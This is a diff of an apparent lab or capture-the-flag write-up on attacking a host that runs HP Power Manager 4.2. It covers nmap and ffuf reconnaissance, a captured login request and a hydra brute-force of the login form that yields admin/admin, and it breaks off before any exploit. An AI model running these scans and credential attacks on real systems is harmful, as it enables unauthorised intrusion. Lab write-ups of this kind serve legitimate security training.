@@ -1,20 +1,20 @@
-# target: 192.168.161.45
+# target: 192.168.107.45
 
 # reconnaissance
 
 ```bash
-nmap 192.168.161.45 -p- --open -Pn -O -sV -sC -oN nmap.txt
+nmap 192.168.107.45 -p- --open -Pn -O -sV -sC -oN nmap.txt
 ```
 
 ```
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 07:41 +0000
-Nmap scan report for 192.168.161.45
+Nmap scan report for 192.168.107.45
 Host is up (0.00042s latency).
 Not shown: 54466 closed tcp ports (reset), 11057 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT      STATE SERVICE      VERSION
 80/tcp    open  http         GoAhead WebServer
-|_http-title: Did not follow redirect to http://192.168.161.45/index.asp
+|_http-title: Did not follow redirect to http://192.168.107.45/index.asp
 |_http-server-header: GoAhead-Webs
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
@@ -83,7 +83,7 @@ Nmap done: 1 IP address (1 host up) scanned in 118.96 seconds
 ```
 
 ```bash
-ffuf -u http://192.168.161.45:80/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
+ffuf -u http://192.168.107.45:80/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
 ```
 
 ```txt
@@ -100,7 +100,7 @@ ffuf -u http://192.168.161.45:80/FUZZ -w /usr/share/seclists/Discovery/Web-Conte
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://192.168.161.45:80/FUZZ
+ :: URL              : http://192.168.107.45:80/FUZZ
  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
  :: Follow redirects : false
  :: Calibration      : false
@@ -125,7 +125,7 @@ nul                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms
 ## subdoamin
 
 ```bash
-ffuf -u http://192.168.161.45:80 -H "Host:FUZZ.192.168.161.45" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 302
+ffuf -u http://192.168.107.45:80 -H "Host:FUZZ.192.168.107.45" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 302
 ```
 
 ```txt
@@ -142,9 +142,9 @@ ffuf -u http://192.168.161.45:80 -H "Host:FUZZ.192.168.161.45" -w /usr/share/sec
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://192.168.161.45:80
+ :: URL              : http://192.168.107.45:80
  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
- :: Header           : Host: FUZZ.192.168.161.45
+ :: Header           : Host: FUZZ.192.168.107.45
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
@@ -157,49 +157,53 @@ ________________________________________________
 
 ```
 
-> http://192.168.161.45/index.asp
+> http://192.168.107.45/index.asp
 > HP Power Manager login page
 
-![](image.png)
+![HP Power Manager login page](https://github.com/user-attachments/assets/5992ee52-d7f5-4e79-87f2-3c302df9f5c1)
 
 > POST
 
-![](image_1.png)
+![POST request](https://github.com/user-attachments/assets/dd1b487e-9966-43bc-8321-a366026d9b14)
 
 ```txt
 POST /goform/formLogin HTTP/1.1
-Host: 192.168.161.45
+Host: 192.168.107.45
 Content-Length: 68
 Cache-Control: max-age=0
 Accept-Language: en-US,en;q=0.9
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
-Origin: http://192.168.161.45
+Origin: http://192.168.107.45
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://192.168.161.45/index.asp
+Referer: http://192.168.107.45/index.asp
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
 HtmlOnly=true&Login=admin&Password=password&loginButton=Submit+Login
 ```
 
+![login form POST details](https://github.com/user-attachments/assets/b6bc3eb4-ca6e-44e5-a948-607addc48362)
+
 ```bash
-sudo hydra -V -F -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.161.45 http-post-form "/goform/formLogin:HtmlOnly=true&Login=^USER^&Password=^PASS^&loginButton=Submit+Login:Invalid"
+hydra -V -F -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 192.168.107.45 http-post-form "/goform/formLogin:HtmlOnly=true&Login=^USER^&Password=^PASS^&loginButton=Submit+Login:Invalid"
 ```
 
-> admin/admin
-> http://192.168.161.45/Contents/index.asp
+![hydra cracking result](https://github.com/user-attachments/assets/7423d109-8609-4800-8c65-9f1500233381)
 
-![](image_2.png)
+> admin/admin
+> http://192.168.107.45/Contents/index.asp
+
+![admin/admin login success](https://github.com/user-attachments/assets/b1ad81c8-ce6e-4d68-b573-41d44c474971)
 
 > No exists Header Token
 > I doubt the IP based trust machanism
 
-![](image_3.png)
+![No Header Token](https://github.com/user-attachments/assets/5b13854b-45df-4dfc-8a97-8eb2f9fd7d3f)
 
 > HP Power Manager 4.2
-> ![](image_4.png)
+> ![HP Power Manager 4.2](https://github.com/user-attachments/assets/6bb8f755-bb01-4262-8841-793236f3a428)
 
 ```bash
 # update exploit db
